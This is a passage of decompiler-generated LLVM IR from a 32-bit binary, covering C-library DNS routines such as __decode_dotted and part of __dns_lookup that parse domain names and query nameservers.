  store i32 %v2_804d79f, i32* @eax, align 4
  %tmp67 = icmp ugt i32 %v2_804d79f, %arg4
  br i1 %tmp67, label %dec_label_pc_804d7a7, label %dec_label_pc_804d7b4

dec_label_pc_804d7a7:                             ; preds = %dec_label_pc_804d795
  %v0_804d7a7 = load i8*, i8** %stack_var_-112, align 4
  %v1_804d7a7 = ptrtoint i8* %v0_804d7a7 to i32
  %v2_804d7a7 = call i32 @__GI___errno_location(i32 %v1_804d7a7)
  %v1_804d7ac = inttoptr i32 %v2_804d7a7 to i32*
  store i32 28, i32* %v1_804d7ac, align 4
  br label %dec_label_pc_804d7cf

dec_label_pc_804d7b4:                             ; preds = %dec_label_pc_804d795
  %v8_804d7b5 = inttoptr i32 %arg3 to i8*
  %v5_804d7b9 = call i32 @strcpy(i8* %v8_804d7b5, i32 %v2_804d6f7)
  br label %dec_label_pc_804d7d1

dec_label_pc_804d7c4:                             ; preds = %dec_label_pc_804d63d
  %v1_804d7c4 = call i32 @__GI___errno_location(i32 %v0_804d630)
  %v1_804d7c9 = inttoptr i32 %v1_804d7c4 to i32*
  store i32 97, i32* %v1_804d7c9, align 4
  br label %dec_label_pc_804d7cf

dec_label_pc_804d7cf:                             ; preds = %dec_label_pc_804d7a7, %dec_label_pc_804d7c4
  br label %dec_label_pc_804d7d1

dec_label_pc_804d7d1:                             ; preds = %dec_label_pc_804d742, %dec_label_pc_804d7b4, %dec_label_pc_804d648, %dec_label_pc_804d7cf
  %v0_804d7d1 = phi i32 [ 0, %dec_label_pc_804d742 ], [ %v5_804d7b9, %dec_label_pc_804d7b4 ], [ %v3_804d654, %dec_label_pc_804d648 ], [ 0, %dec_label_pc_804d7cf ]
  ret i32 %v0_804d7d1

; uselistorder directives
  uselistorder i32 %v2_804d79f, { 1, 0 }
  uselistorder i32 %v1_804d77e, { 0, 2, 1 }
  uselistorder i32 %v0_804d773, { 1, 0 }
  uselistorder i32 %v0_804d725, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_804d724, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v0_804d72156, { 0, 3, 2, 1 }
  uselistorder i32 %v0_804d71d58, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804d6f7, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804d6ef, { 1, 0 }
  uselistorder i32 %v1_804d6fd.pre50, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v10_804d6ea, { 1, 0 }
  uselistorder i32 %v0_804d6c213, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d6cd16, { 0, 2, 1, 3 }
  uselistorder i1 %v10_804d6bd, { 1, 0 }
  uselistorder i32 %v0_804d6e860, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804d6dd61, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804d6e662, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v0_804d6d264, { 3, 1, 2, 0 }
  uselistorder i32 %v1_804d693, { 0, 2, 3, 1 }
  uselistorder i32 %v0_804d688, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804d630, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i8** %stack_var_-112, { 1, 0 }
  uselistorder i32 97, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 65535, { 1, 0, 2 }
  uselistorder i32 15, { 0, 6, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7d1, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7cf, { 1, 0 }
  uselistorder label %dec_label_pc_804d795, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d77e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d705, { 1, 0 }
  uselistorder label %dec_label_pc_804d6f7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d6ef, { 1, 0 }
  uselistorder label %dec_label_pc_804d6ea.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804d6d2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d6cf, { 1, 0 }
  uselistorder label %dec_label_pc_804d6a5, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804d7dd = load i32, i32* @edi, align 4
  %v0_804d7de = load i32, i32* @esi, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v4_804d7e7 = icmp eq i32 %arg1, 0
  br i1 %v4_804d7e7, label %dec_label_pc_804d8d7, label %dec_label_pc_804d7f2

dec_label_pc_804d7f2:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  %v5_804d8072939 = sub i32 %arg2, %arg3
  %v11_804d8073040 = xor i32 %arg2, %arg3
  %v12_804d8073141 = xor i32 %v5_804d8072939, %arg2
  %v13_804d8073242 = and i32 %v12_804d8073141, %v11_804d8073040
  %v14_804d8073343 = icmp slt i32 %v13_804d8073242, 0
  %v16_804d8073545 = icmp slt i32 %v5_804d8072939, 0
  %v2_804d80b3646 = icmp eq i1 %v16_804d8073545, %v14_804d8073343
  br i1 %v2_804d80b3646, label %dec_label_pc_804d8d7, label %dec_label_pc_804d811.lr.ph

dec_label_pc_804d811.lr.ph:                       ; preds = %dec_label_pc_804d7f2, %dec_label_pc_804d846
  %v0_804d8cd74 = phi i32 [ %v4_804d84b, %dec_label_pc_804d846 ], [ 0, %dec_label_pc_804d7f2 ]
  %storemerge.ph49 = phi i32 [ %storemerge38, %dec_label_pc_804d846 ], [ 0, %dec_label_pc_804d7f2 ]
  %v0_804d82b.ph47 = phi i32 [ %v2_804d85e, %dec_label_pc_804d846 ], [ %arg2, %dec_label_pc_804d7f2 ]
  %stack_var_-21.1.ph48 = phi i1 [ true, %dec_label_pc_804d846 ], [ false, %dec_label_pc_804d7f2 ]
  %v3_804d825 = select i1 %stack_var_-21.1.ph48, i32 2, i32 1
  br label %dec_label_pc_804d811

dec_label_pc_804d811:                             ; preds = %dec_label_pc_804d8aa.dec_label_pc_804d811_crit_edge, %dec_label_pc_804d811.lr.ph
  %v0_804d8cd = phi i32 [ %v0_804d8cd74, %dec_label_pc_804d811.lr.ph ], [ %v0_804d8cd.pre, %dec_label_pc_804d8aa.dec_label_pc_804d811_crit_edge ]
  %storemerge38 = phi i32 [ %storemerge.ph49, %dec_label_pc_804d811.lr.ph ], [ %v0_804d803.pre, %dec_label_pc_804d8aa.dec_label_pc_804d811_crit_edge ]
  %v0_804d82b37 = phi i32 [ %v0_804d82b.ph47, %dec_label_pc_804d811.lr.ph ], [ %v0_804d807.pre.pre, %dec_label_pc_804d8aa.dec_label_pc_804d811_crit_edge ]
  store i32 %arg1, i32* @ecx, align 4
  %v2_804d815 = add i32 %v0_804d82b37, %arg1
  %v3_804d815 = inttoptr i32 %v2_804d815 to i8*
  %v4_804d815 = load i8, i8* %v3_804d815, align 1
  %v5_804d815 = zext i8 %v4_804d815 to i32
  %v4_804d818 = icmp eq i8 %v4_804d815, 0
  br i1 %v4_804d818, label %dec_label_pc_804d8c8, label %dec_label_pc_804d820

dec_label_pc_804d820:                             ; preds = %dec_label_pc_804d811
  %v4_804d825 = add i32 %v3_804d825, %v0_804d8cd
  store i32 %v4_804d825, i32* %ebp.global-to-local, align 4
  store i32 %v5_804d815, i32* @esi, align 4
  %v1_804d82b = add i32 %v0_804d82b37, 1
  store i32 %v1_804d82b, i32* @ecx, align 4
  %v1_804d830 = and i32 %v5_804d815, 192
  %v6_804d835 = icmp eq i32 %v1_804d830, 192
  %v1_804d83a = icmp eq i1 %v6_804d835, false
  br i1 %v1_804d83a, label %dec_label_pc_804d86b, label %dec_label_pc_804d83c

dec_label_pc_804d83c:                             ; preds = %dec_label_pc_804d820
  %v5_804d83c = sub i32 %v1_804d82b, %arg3
  %v11_804d83c = xor i32 %v1_804d82b, %arg3
  %v12_804d83c = xor i32 %v5_804d83c, %v1_804d82b
  %v13_804d83c = and i32 %v12_804d83c, %v11_804d83c
  %v14_804d83c = icmp slt i32 %v13_804d83c, 0
  %v16_804d83c = icmp slt i32 %v5_804d83c, 0
  %v2_804d840 = icmp eq i1 %v16_804d83c, %v14_804d83c
  br i1 %v2_804d840, label %dec_label_pc_804d8d7, label %dec_label_pc_804d846

dec_label_pc_804d846:                             ; preds = %dec_label_pc_804d83c
  %v4_804d84b = add i32 %v3_804d825, %v4_804d825
  store i32 %v4_804d84b, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v4_804d815, 64
  %v1_804d850 = zext i8 %tmp to i32
  %v2_804d853 = mul nuw nsw i32 %v1_804d850, 256
  store i32 %v2_804d853, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804d85a = add i32 %v1_804d82b, %arg1
  %v3_804d85a = inttoptr i32 %v2_804d85a to i8*
  %v4_804d85a = load i8, i8* %v3_804d85a, align 1
  %v5_804d85a = zext i8 %v4_804d85a to i32
  store i32 %v5_804d85a, i32* @eax, align 4
  %v2_804d85e = or i32 %v5_804d85a, %v2_804d853
  store i32 %v2_804d85e, i32* %edx.global-to-local, align 4
  %v5_804d80729 = sub i32 %v2_804d85e, %arg3
  %v13_804d80732 = and i32 %v5_804d80729, %arg3
  %v14_804d80733 = icmp slt i32 %v13_804d80732, 0
  %v16_804d80735 = icmp slt i32 %v5_804d80729, 0
  %v2_804d80b36 = icmp eq i1 %v16_804d80735, %v14_804d80733
  br i1 %v2_804d80b36, label %dec_label_pc_804d8d7, label %dec_label_pc_804d811.lr.ph

dec_label_pc_804d86b:                             ; preds = %dec_label_pc_804d820
  %v2_804d86f = add i32 %v5_804d815, %storemerge38
  store i32 %v2_804d86f, i32* %stack_var_-28, align 4
  %v1_804d876 = add i32 %v2_804d86f, 1
  store i32 %v1_804d876, i32* @edi, align 4
  %v10_804d877 = icmp ult i32 %v1_804d876, %arg5
  %v1_804d87b = icmp eq i1 %v10_804d877, false
  br i1 %v1_804d87b, label %dec_label_pc_804d8d7, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d86b
  %v2_804d87d = add i32 %v5_804d815, %v1_804d82b
  store i32 %v2_804d87d, i32* %ebx.global-to-local, align 4
  %v10_804d880 = icmp ult i32 %v2_804d87d, %arg3
  %v1_804d884 = icmp eq i1 %v10_804d880, false
  br i1 %v1_804d884, label %dec_label_pc_804d8d7, label %dec_label_pc_804d886

dec_label_pc_804d886:                             ; preds = %dec_label_pc_804d87d
  %v2_804d88b = add i32 %v1_804d82b, %arg1
  %v5_804d892 = add i32 %storemerge38, %arg4
  %v3_804d897 = inttoptr i32 %v5_804d892 to i8*
  %v4_804d897 = call i32 @memcpy(i8* %v3_804d897, i32 %v2_804d88b, i32 %v5_804d815)
  %v0_804d89c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804d89c, i32* %edx.global-to-local, align 4
  br i1 %stack_var_-21.1.ph48, label %dec_label_pc_804d8aa, label %dec_label_pc_804d8a8

dec_label_pc_804d8a8:                             ; preds = %dec_label_pc_804d886
  %v0_804d8a8 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804d8a8 = load i32, i32* @esi, align 4
  %v2_804d8a8 = add i32 %v1_804d8a8, %v0_804d8a8
  store i32 %v2_804d8a8, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804d8aa

dec_label_pc_804d8aa:                             ; preds = %dec_label_pc_804d886, %dec_label_pc_804d8a8
  store i32 46, i32* @eax, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  %v2_804d8bd = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_804d8bd, i32* @ecx, align 4
  %v4_804d8c0 = add i32 %v2_804d8bd, %arg4
  %v5_804d8c0 = inttoptr i32 %v4_804d8c0 to i8*
  store i8 46, i8* %v5_804d8c0, align 1
  %v0_804d807.pre.pre = load i32, i32* %edx.global-to-local, align 4
  %v5_804d807 = sub i32 %v0_804d807.pre.pre, %arg3
  %v11_804d807 = xor i32 %v0_804d807.pre.pre, %arg3
  %v12_804d807 = xor i32 %v5_804d807, %v0_804d807.pre.pre
  %v13_804d807 = and i32 %v12_804d807, %v11_804d807
  %v14_804d807 = icmp slt i32 %v13_804d807, 0
  %v16_804d807 = icmp slt i32 %v5_804d807, 0
  %v2_804d80b = icmp eq i1 %v16_804d807, %v14_804d807
  br i1 %v2_804d80b, label %dec_label_pc_804d8d7, label %dec_label_pc_804d8aa.dec_label_pc_804d811_crit_edge

dec_label_pc_804d8aa.dec_label_pc_804d811_crit_edge: ; preds = %dec_label_pc_804d8aa
  %v0_804d803.pre = load i32, i32* @edi, align 4
  %v0_804d8cd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804d811

dec_label_pc_804d8c8:                             ; preds = %dec_label_pc_804d811
  %v4_804d8cf = add i32 %v3_804d825, %v0_804d8cd
  br label %dec_label_pc_804d8d7

dec_label_pc_804d8d7:                             ; preds = %dec_label_pc_804d87d, %dec_label_pc_804d86b, %dec_label_pc_804d8aa, %dec_label_pc_804d7f2, %dec_label_pc_804d846, %dec_label_pc_804d83c, %entry, %dec_label_pc_804d8c8
  %storemerge1 = phi i32 [ %v4_804d8cf, %dec_label_pc_804d8c8 ], [ -1, %entry ], [ -1, %dec_label_pc_804d83c ], [ -1, %dec_label_pc_804d846 ], [ -1, %dec_label_pc_804d7f2 ], [ -1, %dec_label_pc_804d8aa ], [ -1, %dec_label_pc_804d86b ], [ -1, %dec_label_pc_804d87d ]
  store i32 %v0_804d7de, i32* @esi, align 4
  store i32 %v0_804d7dd, i32* @edi, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v5_804d807, { 1, 0 }
  uselistorder i32 %v0_804d807.pre.pre, { 2, 1, 0, 3 }
  uselistorder i32 %v5_804d80729, { 1, 0 }
  uselistorder i32 %v2_804d85e, { 1, 2, 0 }
  uselistorder i32 %v2_804d853, { 1, 0 }
  uselistorder i32 %v4_804d84b, { 1, 0 }
  uselistorder i32 %v5_804d83c, { 1, 0 }
  uselistorder i32 %v1_804d82b, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v5_804d815, { 4, 0, 1, 2, 3 }
  uselistorder i32 %storemerge38, { 2, 1, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg3, { 5, 6, 8, 0, 3, 4, 7, 1, 2 }
  uselistorder i32 %arg1, { 0, 1, 5, 2, 4, 3 }
  uselistorder label %dec_label_pc_804d8d7, { 7, 2, 0, 1, 4, 5, 3, 6 }
  uselistorder label %dec_label_pc_804d8aa, { 1, 0 }
  uselistorder label %dec_label_pc_804d811.lr.ph, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i32, align 4
  %stack_var_-496 = alloca i32, align 4
  %v12_804d8e4 = ptrtoint i32* %stack_var_-496 to i32
  %v4_804d8ea = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d8ea, i32* @ebx, align 4
  store i32 512, i32* %stack_var_-500, align 4
  %v1_804d8f6 = call i32 @malloc(i32 512)
  store i32 %v1_804d8f6, i32* %eax.global-to-local, align 4
  %v1_804d8fb = inttoptr i32 %v1_804d8f6 to i8*
  store i32 %v1_804d8f6, i32* @ebp, align 4
  %v0_804d8fd = load i32, i32* @ebx, align 4
  %v5_804d8fd = inttoptr i32 %v0_804d8fd to i8*
  %v3_804d8fe = call i32 @strlen(i8* %v5_804d8fd)
  store i32 %v3_804d8fe, i32* %eax.global-to-local, align 4
  store i32 %v0_804d8fd, i32* %ecx.global-to-local, align 4
  %v2_804d908 = load i32, i32* %stack_var_-500, align 4
  store i32 %v2_804d908, i32* @esi, align 4
  %tmp125 = icmp ult i32 %v3_804d8fe, 895
  br i1 %tmp125, label %dec_label_pc_804d925, label %dec_label_pc_804dfb3

dec_label_pc_804d925:                             ; preds = %entry
  %v1_804d929 = add i32 %v3_804d8fe, 130
  store i32 %v1_804d929, i32* %eax.global-to-local, align 4
  store i32 %v1_804d929, i32* %stack_var_-500, align 4
  %v1_804d92f = call i32 @malloc(i32 %v1_804d929)
  store i32 %v1_804d92f, i32* %eax.global-to-local, align 4
  store i32 %v1_804d929, i32* %edx.global-to-local, align 4
  %v2_804d939 = icmp eq i32 %v1_804d8f6, 0
  br i1 %v2_804d939, label %dec_label_pc_804dfab, label %dec_label_pc_804d941

dec_label_pc_804d941:                             ; preds = %dec_label_pc_804d925
  %v1_804d941 = icmp eq i32 %v1_804d92f, 0
  br i1 %v1_804d941, label %dec_label_pc_804dfab, label %dec_label_pc_804d949

dec_label_pc_804d949:                             ; preds = %dec_label_pc_804d941
  %v0_804d949 = load i32, i32* @ebx, align 4
  %v1_804d949 = inttoptr i32 %v0_804d949 to i8*
  %v2_804d949 = load i8, i8* %v1_804d949, align 1
  %v3_804d949 = icmp eq i8 %v2_804d949, 0
  br i1 %v3_804d949, label %dec_label_pc_804dfab, label %dec_label_pc_804d952

dec_label_pc_804d952:                             ; preds = %dec_label_pc_804d949
  store i32 %v3_804d8fe, i32* %eax.global-to-local, align 4
  %v2_804d956 = add i32 %v3_804d8fe, -1
  %v3_804d956 = add i32 %v2_804d956, %v0_804d949
  %v4_804d956 = inttoptr i32 %v3_804d956 to i8*
  %v5_804d956 = load i8, i8* %v4_804d956, align 1
  %v6_804d956 = zext i8 %v5_804d956 to i32
  %v8_804d956 = and i32 %v3_804d8fe, -256
  %v9_804d956 = or i32 %v6_804d956, %v8_804d956
  store i32 %v9_804d956, i32* %eax.global-to-local, align 4
  store i32 %v3_804d8fe, i32* %stack_var_-500, align 4
  %v4_804d967 = inttoptr i32 %v1_804d92f to i8*
  %v5_804d967 = call i32 @memcpy(i8* %v4_804d967, i32 %v0_804d949, i32 %v3_804d8fe)
  store i32 %v5_804d967, i32* %eax.global-to-local, align 4
  store i32 %v3_804d8fe, i32* @ecx, align 4
  %v2_804d997 = add i32 %v3_804d8fe, 1
  %v3_804d997 = add i32 %v2_804d997, %v1_804d92f
  store i32 %v3_804d997, i32* %edx.global-to-local, align 4
  %v3_804d9c2 = inttoptr i32 %v3_804d997 to i32*
  %v3_804da80 = inttoptr i32 %v3_804d997 to i8*
  br label %dec_label_pc_804d99f

dec_label_pc_804d99f:                             ; preds = %dec_label_pc_804df9b, %dec_label_pc_804d952
  %v0_804d9a6 = phi i32 [ %v0_804df9f, %dec_label_pc_804df9b ], [ %v12_804d8e4, %dec_label_pc_804d952 ]
  %v1_804d99f = add i32 %v0_804d9a6, 28
  %v2_804d99f = inttoptr i32 %v1_804d99f to i32*
  %v3_804d99f = load i32, i32* %v2_804d99f, align 4
  %v13_804d99f = icmp eq i32 %v3_804d99f, -1
  br i1 %v13_804d99f, label %dec_label_pc_804d9b0, label %dec_label_pc_804d9a6

dec_label_pc_804d9a6:                             ; preds = %dec_label_pc_804d99f
  %v5_804d9a6 = add i32 %v0_804d9a6, -4
  %v6_804d9a6 = inttoptr i32 %v5_804d9a6 to i32*
  store i32 %v3_804d99f, i32* %v6_804d9a6, align 4
  %v1_804d9aa = call i32 @__GI_close(i32 %v3_804d997)
  store i32 %v1_804d9aa, i32* %eax.global-to-local, align 4
  %v0_804d9af = load i32, i32* @esp, align 4
  %v1_804d9af = inttoptr i32 %v0_804d9af to i32*
  %v2_804d9af = load i32, i32* %v1_804d9af, align 4
  store i32 %v2_804d9af, i32* @edi, align 4
  %v3_804d9af = add i32 %v0_804d9af, 4
  br label %dec_label_pc_804d9b0

dec_label_pc_804d9b0:                             ; preds = %dec_label_pc_804d99f, %dec_label_pc_804d9a6
  %v0_804d9b0 = phi i32 [ %v0_804d9a6, %dec_label_pc_804d99f ], [ %v3_804d9af, %dec_label_pc_804d9a6 ]
  %v1_804d9b0 = add i32 %v0_804d9b0, -4
  %v2_804d9b0 = inttoptr i32 %v1_804d9b0 to i32*
  store i32 ptrtoint (i32* @global_var_80557d8.103 to i32), i32* %v2_804d9b0, align 4
  %v1_804d9b5 = add i32 %v0_804d9b0, -8
  %v2_804d9b5 = inttoptr i32 %v1_804d9b5 to i32*
  store i32 134525440, i32* %v2_804d9b5, align 4
  %v1_804d9ba = add i32 %v0_804d9b0, 444
  store i32 %v1_804d9ba, i32* @ebx, align 4
  %v2_804d9c1 = add i32 %v0_804d9b0, -12
  %v3_804d9c1 = inttoptr i32 %v2_804d9c1 to i32*
  store i32 %v1_804d9ba, i32* %v3_804d9c1, align 4
  %v4_804d9c2 = call i32 @_pthread_cleanup_push_defer(i32* %v3_804d9c2, i32 %v3_804d8fe, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d9c2, i32* %eax.global-to-local, align 4
  %v0_804d9c7 = load i32, i32* @esp, align 4
  %v1_804d9c7 = add i32 %v0_804d9c7, -4
  %v2_804d9c7 = inttoptr i32 %v1_804d9c7 to i32*
  store i32 ptrtoint (i32* @global_var_80557d8.103 to i32), i32* %v2_804d9c7, align 4
  %v1_804d9cc = call i32 @__pthread_return_0(i32 %v3_804d997)
  store i32 %v1_804d9cc, i32* @eax, align 4
  %v0_804d9d1 = call i32 @__open_nameservers()
  store i32 %v0_804d9d1, i32* %eax.global-to-local, align 4
  %v0_804d9d6 = load i32, i32* @global_var_8055ba0.104, align 32
  store i32 %v0_804d9d6, i32* %ecx.global-to-local, align 4
  %v1_804d9dc = load i32, i32* @esp, align 4
  %v2_804d9dc = add i32 %v1_804d9dc, 36
  %v3_804d9dc = inttoptr i32 %v2_804d9dc to i32*
  store i32 %v0_804d9d6, i32* %v3_804d9dc, align 4
  %v0_804d9e0 = load i32, i32* @esp, align 4
  %v1_804d9e0 = add i32 %v0_804d9e0, 60
  %v2_804d9e0 = inttoptr i32 %v1_804d9e0 to i32*
  %v3_804d9e0 = load i32, i32* %v2_804d9e0, align 4
  store i32 %v3_804d9e0, i32* %eax.global-to-local, align 4
  %v2_804d9e4 = add i32 %v0_804d9e0, 28
  %v3_804d9e4 = inttoptr i32 %v2_804d9e4 to i32*
  %v4_804d9e4 = load i32, i32* %v3_804d9e4, align 4
  %v5_804d9e4 = add i32 %v4_804d9e4, %v3_804d9e0
  store i32 %v5_804d9e4, i32* %eax.global-to-local, align 4
  %v1_804d9e8 = inttoptr i32 %v5_804d9e4 to i8*
  store i8 0, i8* %v1_804d9e8, align 1
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v1_804d9eb = add i32 %v0_804d9eb, 16
  %v1_804d9ee = add i32 %v0_804d9eb, 64
  %v2_804d9ee = inttoptr i32 %v1_804d9ee to i32*
  %v3_804d9ee = load i32, i32* %v2_804d9ee, align 4
  %v4_804d9ee = load i32, i32* %ecx.global-to-local, align 4
  %v10_804d9ee = icmp ult i32 %v3_804d9ee, %v4_804d9ee
  %v1_804d9f2 = icmp eq i1 %v10_804d9ee, false
  br i1 %v1_804d9f2, label %dec_label_pc_804da0e, label %dec_label_pc_804d9f4

dec_label_pc_804d9f4:                             ; preds = %dec_label_pc_804d9b0
  %v0_804d9f4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d9f4 = inttoptr i32 %v0_804d9f4 to i8*
  store i8 46, i8* %v1_804d9f4, align 1
  %v0_804d9f7 = load i32, i32* @global_var_8055b94.105, align 4
  store i32 %v0_804d9f7, i32* @eax, align 4
  %v0_804d9fc = load i32, i32* @esp, align 4
  %v1_804d9fc = add i32 %v0_804d9fc, 48
  %v2_804d9fc = inttoptr i32 %v1_804d9fc to i32*
  %v3_804d9fc = load i32, i32* %v2_804d9fc, align 4
  store i32 %v3_804d9fc, i32* %edx.global-to-local, align 4
  %v2_804da00 = mul i32 %v3_804d9fc, 4
  %v3_804da00 = add i32 %v2_804da00, %v0_804d9f7
  %v4_804da00 = inttoptr i32 %v3_804da00 to i32*
  %v5_804da00 = load i32, i32* %v4_804da00, align 4
  %v7_804da00 = add i32 %v0_804d9fc, -4
  %v8_804da00 = inttoptr i32 %v7_804da00 to i32*
  store i32 %v5_804da00, i32* %v8_804da00, align 4
  %v1_804da03 = add i32 %v0_804d9fc, 8
  %v2_804da03 = inttoptr i32 %v1_804da03 to i32*
  %v3_804da03 = load i32, i32* %v2_804da03, align 4
  %v5_804da03 = add i32 %v0_804d9fc, -8
  %v6_804da03 = inttoptr i32 %v5_804da03 to i32*
  store i32 %v3_804da03, i32* %v6_804da03, align 4
  %v3_804da07 = call i32 @strcpy(i8* %v3_804da80, i32 %v3_804d8fe)
  store i32 %v3_804da07, i32* %eax.global-to-local, align 4
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v2_804da0c = load i32, i32* %v1_804da0c, align 4
  store i32 %v2_804da0c, i32* %ecx.global-to-local, align 4
  %v3_804da0c = add i32 %v0_804da0c, 4
  %v1_804da0d = inttoptr i32 %v3_804da0c to i32*
  %v2_804da0d = load i32, i32* %v1_804da0d, align 4
  store i32 %v2_804da0d, i32* @esi, align 4
  %v3_804da0d = add i32 %v0_804da0c, 8
  br label %dec_label_pc_804da0e

dec_label_pc_804da0e:                             ; preds = %dec_label_pc_804d9b0, %dec_label_pc_804d9f4
  %v1_804da1c = phi i32 [ %v1_804d9eb, %dec_label_pc_804d9b0 ], [ %v3_804da0d, %dec_label_pc_804d9f4 ]
  %v1_804da0e = add i32 %v1_804da1c, 52
  %v2_804da0e = inttoptr i32 %v1_804da0e to i32*
  %v3_804da0e = load i32, i32* %v2_804da0e, align 4
  %v5_804da0e = icmp slt i32 %v3_804da0e, 0
  %v1_804da13 = icmp eq i1 %v5_804da0e, false
  br i1 %v1_804da13, label %dec_label_pc_804da3b, label %dec_label_pc_804da15

dec_label_pc_804da15:                             ; preds = %dec_label_pc_804da0e
  %v0_804da15 = load i16, i16* @global_var_8053580.106, align 128
  %v1_804da15 = zext i16 %v0_804da15 to i32
  store i32 %v1_804da15, i32* %ecx.global-to-local, align 4
  %v2_804da1c = add i32 %v1_804da1c, 56
  %v3_804da1c = inttoptr i32 %v2_804da1c to i32*
  store i32 %v1_804da15, i32* %v3_804da1c, align 4
  %v0_804da20 = load i32, i32* @global_var_80557d4.107, align 4
  store i32 %v0_804da20, i32* %eax.global-to-local, align 4
  %v1_804da25 = load i32, i32* @esp, align 4
  %v2_804da25 = add i32 %v1_804da25, 52
  %v3_804da25 = inttoptr i32 %v2_804da25 to i32*
  store i32 %v0_804da20, i32* %v3_804da25, align 4
  %v0_804da29 = load i8, i8* bitcast (i8** @global_var_8053585.108 to i8*), align 4
  %v1_804da30 = load i64, i64* @global_var_8055b9c.109, align 8
  %v3_804da30 = zext i8 %v0_804da29 to i64
  %v5_804da30 = mul nsw i64 %v1_804da30, %v3_804da30
  %v6_804da30 = trunc i64 %v5_804da30 to i32
  store i32 %v6_804da30, i32* %edx.global-to-local, align 4
  %v1_804da37 = load i32, i32* @esp, align 4
  %v2_804da37 = add i32 %v1_804da37, 40
  %v3_804da37 = inttoptr i32 %v2_804da37 to i32*
  store i32 %v6_804da30, i32* %v3_804da37, align 4
  %v0_804da3b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804da3b

dec_label_pc_804da3b:                             ; preds = %dec_label_pc_804da0e, %dec_label_pc_804da15
  %v1_804da4e = phi i32 [ %v1_804da1c, %dec_label_pc_804da0e ], [ %v0_804da3b.pre, %dec_label_pc_804da15 ]
  %v1_804da3b = add i32 %v1_804da4e, 52
  %v2_804da3b = inttoptr i32 %v1_804da3b to i32*
  %v3_804da3b = load i32, i32* %v2_804da3b, align 4
  %v1_804da41 = load i64, i64* @global_var_8055b9c.109, align 8
  %v2_804da41 = trunc i64 %v1_804da41 to i32
  %v8_804da41 = icmp ult i32 %v3_804da3b, %v2_804da41
  %v1_804da4a = sext i1 %v8_804da41 to i32
  store i32 %v1_804da4a, i32* %eax.global-to-local, align 4
  %v2_804da4c = select i1 %v8_804da41, i32 %v3_804da3b, i32 0
  store i32 %v2_804da4c, i32* %ecx.global-to-local, align 4
  store i32 %v2_804da4c, i32* %v2_804da3b, align 4
  %v0_804da52 = load i32, i32* @esp, align 4
  %v1_804da52 = add i32 %v0_804da52, 56
  %v2_804da52 = inttoptr i32 %v1_804da52 to i32*
  %v3_804da52 = load i32, i32* %v2_804da52, align 4
  %v1_804da56 = add i32 %v3_804da52, 1
  %v1_804da57 = urem i32 %v1_804da56, 65536
  store i32 %v1_804da57, i32* %eax.global-to-local, align 4
  store i32 %v1_804da57, i32* %v2_804da52, align 4
  %v0_804da60 = load i32, i32* %eax.global-to-local, align 4
  %v1_804da60 = trunc i32 %v0_804da60 to i16
  store i16 %v1_804da60, i16* @global_var_8053580.106, align 128
  %v0_804da66 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804da66, i32* @global_var_80557d4.107, align 4
  %v3_804da6c = mul i32 %v0_804da66, 28
  %v1_804da6f = load i32, i32* @global_var_8055b98.110, align 8
  %v2_804da6f = add i32 %v1_804da6f, %v3_804da6c
  store i32 %v2_804da6f, i32* %eax.global-to-local, align 4
  %v0_804da75 = load i32, i32* @esp, align 4
